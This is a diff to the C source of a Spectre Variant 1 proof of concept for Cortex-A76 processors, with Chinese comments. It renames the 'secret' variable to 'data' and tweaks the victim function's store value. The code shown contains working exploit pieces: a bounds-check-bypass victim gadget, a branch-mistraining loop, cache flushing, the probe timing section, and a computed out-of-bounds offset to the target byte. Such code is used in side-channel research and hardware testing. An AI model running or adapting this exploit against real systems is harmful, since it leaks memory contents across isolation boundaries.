@@ -65,10 +65,10 @@ uint8_t unused2[64];
 uint8_t array2[256 * 64] __attribute__((aligned(4096)));;
 
 
-// char *secret = "s";
-// set secret value = int SECRET_VALUE
+// char *data = "s";
+// set data value = int SECRET_VALUE
 char ch = SECRET_VALUE;
-char *secret = &ch;
+char *data = &ch;
 
 uint8_t temp = 0; /* 用于防止编译器优化掉内存访问 */
 
@@ -78,14 +78,8 @@ void victim_function(size_t x) {
 #if ACCESS_TYPE_LOAD
         temp &= array2[array1[x] * 64];
 #else
-        array2[array1[x] * 64] = 1;
+        array2[array1[x] * 64] = 17;
 #endif
-
-        // for(int t = 0; t < 5; t++){//1,2,3,4
-            // _mStore(&array2[array1[x] * t * 64], 17);
-            // temp &= array2[array1[x] * t * 64];
-        // }
-        // _mStore(&array2[array1[x] * i * 64], 1);
     }
 }
 
@@ -117,13 +111,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
              x = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; 
             x = (x | (x >> 16));
             x = training_x ^ (x & (malicious_x ^ training_x));
-            // 调用受害者函数
+            
             for (i = 0; i < 256; i++) flush_memory(&array2[i * 64]);
             flush_memory(&array1_size);
             victim_function(x);
         }
 
-    
+
         int probe_index = tries % 256;// 0-255
         addr = &array2[probe_index * 64];
         // 关键计时段
@@ -145,19 +139,19 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 }
 
 int main(int argc, const char * * argv) {
-    // *secret = 8; // 将 secret 设置为 8 (ASCII '0')，以便我们知道正确答案应该是 8
+    // *data = 8; // 将 data 设置为 8 (ASCII '0')，以便我们知道正确答案应该是 8
     printf("Spectre Variant 1 PoC for Cortex-A76\n");
     printf("Reading %d bytes:\n", SECRET_LEN);
-    printf("The secret value is set to %d\n", *secret);
+    printf("The data value is set to %d\n", *data);
 
-     /* Default addresses to read is 40 (which is the length of the secret string) */
+     /* Default addresses to read is 40 (which is the length of the data string) */
     // 初始化 array2
     for (size_t i = 0; i < sizeof(array2); i++)
         array2[i] = 1; 
 
-    // 计算 secret 相对于 array1 的偏移量
-    // 假设 secret 存储在 array1 之后的某个位置
-    size_t malicious_x = (size_t)(secret - (char *)array1);
+    // 计算 data 相对于 array1 的偏移量
+    // 假设 data 存储在 array1 之后的某个位置
+    size_t malicious_x = (size_t)(data - (char *)array1);
     
     int len = SECRET_LEN;
     uint8_t value[2];
